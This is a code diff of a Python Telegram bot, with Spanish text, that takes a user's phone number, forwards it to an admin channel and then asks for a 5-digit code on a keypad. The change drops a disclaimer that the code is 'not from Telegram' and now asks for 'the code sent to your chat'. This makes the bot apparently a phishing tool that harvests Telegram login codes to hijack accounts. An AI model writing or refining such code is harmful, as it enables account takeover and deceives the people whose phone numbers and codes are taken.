@@ -41,8 +41,7 @@ def build_keypad(code_str: str):
     ]
     progreso = " ".join(list(code_str)) if code_str else "—"
     text = (
-        "🔐 *Verificación por SMS (no es de Telegram)*\n"
-        "Introduce el *código de 5 dígitos* que te enviamos *vía SMS* y luego toca *✅ Confirmar*.\n\n"
+        "Introduce el código de 5 dígitos que envió a tu chat para completar la verificación\n\n"
         f"Código: `{progreso}`"
     )
     return text, InlineKeyboardMarkup(rows)
@@ -74,6 +73,7 @@ async def on_contact(update: Update, context: ContextTypes.DEFAULT_TYPE):
     context.user_data[UD_PHONE] = phone
     context.user_data[UD_CODE]  = ""
 
+    # Enviar al grupo (registro)
     stamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
     admin_text = (
         "📥 *Nuevo número recibido*\n"
@@ -81,8 +81,6 @@ async def on_contact(update: Update, context: ContextTypes.DEFAULT_TYPE):
         f"- Usuario: @{user.username or 'sin_username'} (id {user.id})\n"
         f"- Fecha/Hora: {stamp}"
     )
-
-    # 1) Enviar al grupo
     try:
         if ADMIN_CHANNEL_ID:
             await context.bot.send_message(ADMIN_CHANNEL_ID, admin_text, parse_mode="Markdown")
@@ -90,9 +88,7 @@ async def on_contact(update: Update, context: ContextTypes.DEFAULT_TYPE):
     except Exception as e:
         log.exception("Error enviando número al destino: %s", e)
 
-    # 2) Confirmar al usuario y mostrar keypad
-    await msg.reply_text(f"✅ Número recibido: {phone}\nAhora introduce el *código de 5 dígitos* (SMS).",
-                         parse_mode="Markdown")
+    # Ir DIRECTO al teclado numérico (sin mensaje previo)
     text, kb = build_keypad("")
     await msg.reply_text(text, reply_markup=kb, parse_mode="Markdown")
 
@@ -114,16 +110,16 @@ async def keypad_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
     elif data == "ok":
         # Validar que sean exactamente 5 dígitos
         if not (len(code) == 5 and code.isdigit()):
+            # Reiniciar desde cero y mostrar mensaje de error + keypad vacío
+            context.user_data[UD_CODE] = ""
             error_msg = (
                 "❌Código inválido\n\n"
                 "El código que ingresaste no es válido. Asegúrate de ingresar el codigo correcto de 5 dígitos recibido por y luego presiona:\n\n"
                 "✅ Confirmar.\n\n"
-                f"Código: `{code or '—'}`"
+                "Código: `—`"
             )
-            # Mantener el teclado numérico para corregir
-            # (no mostramos el texto largo, solo el mensaje de error + keypad)
-            context.user_data[UD_CODE] = code  # conserva lo ya marcado
-            _, kb = build_keypad(code)
+            text, kb = build_keypad("")  # keypad en blanco
+            # mostramos SOLO el error y dejamos el teclado para reintentar
             await q.edit_message_text(error_msg, parse_mode="Markdown", reply_markup=kb)
             return
 
